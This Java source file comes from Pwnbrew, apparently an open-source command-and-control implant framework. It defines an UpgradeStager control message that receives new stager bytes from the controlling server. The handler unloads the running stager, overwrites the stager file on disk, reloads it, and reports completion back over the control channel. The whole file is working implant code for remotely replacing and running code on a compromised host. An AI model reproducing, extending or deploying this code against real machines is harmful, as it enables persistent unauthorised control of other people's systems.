/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* Payload.java
*
* Created on Feb 2, 2014, 7:21:29 PM
*/

package pwnbrew.network.control.messages;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.logging.Level;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.PortManager;
import pwnbrew.misc.LoaderUtilities;
import pwnbrew.misc.Utilities;
import pwnbrew.network.ControlOption;
import pwnbrew.network.control.ControlMessageManager;

/**
 *
 *  
 */
@SuppressWarnings("ucd")
public final class UpgradeStager extends ControlMessage{
    
    private static final byte OPTION_JAR_VERSION = 19;    
    private static final byte OPTION_STAGER = 34;
    
    //Class name
    private static final String NAME_Class = UpgradeStager.class.getSimpleName();   
    private byte[] stagerBytes = null;
    private String jar_version = "";
    
    // ==========================================================================
    /**
     *  Constructor 
     * 
     * @param passedId 
     */
    public UpgradeStager( byte[] passedId ) {
       super(passedId );
    }
    
     //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){      
        
        boolean retVal = true;
        byte[] theValue = tempTlv.getValue();
        switch( tempTlv.getType()){
            case OPTION_STAGER:
                 stagerBytes = Arrays.copyOf(theValue, theValue.length);
                break;
            case OPTION_JAR_VERSION:
                jar_version = new String(theValue);
                break;
            default:
                retVal = false;
                break; 
        }
        return retVal;
    }
    
     //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {   
        
        if( stagerBytes != null && Utilities.isStaged()){
            
            try {
                
                File theStager = Utilities.getClassPath();
                Class stagerClass = Class.forName("stager.Stager");
                ClassLoader aClassLoader = stagerClass.getClassLoader();  
                
                //Unload the stager
                LoaderUtilities.unloadLibs( aClassLoader );

                //Replace the file
                FileOutputStream fileOS = new FileOutputStream(theStager);
                try {
                    
                    //Write the stager bytes
                    fileOS.write(stagerBytes);
                    
                    //Flush the FOS
                    fileOS.flush();
                    
                } catch (IOException ex) {
                    RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );      
                } finally {
                    try {
                        fileOS.close();
                    } catch (IOException ex) {
                    }
                }
                
                //Load it back
                LoaderUtilities.reloadLib(theStager); 
                
                //Send back upgrade complete message
                ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
                if( aCMM != null ){                    
                    UpgradeStagerComplete aUSC = new UpgradeStagerComplete(jar_version);
                    aCMM.send(aUSC);
                }
                
            } catch (ClassNotFoundException | IllegalArgumentException | FileNotFoundException ex) {
                RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );        
            }
            
        }    
    }

}
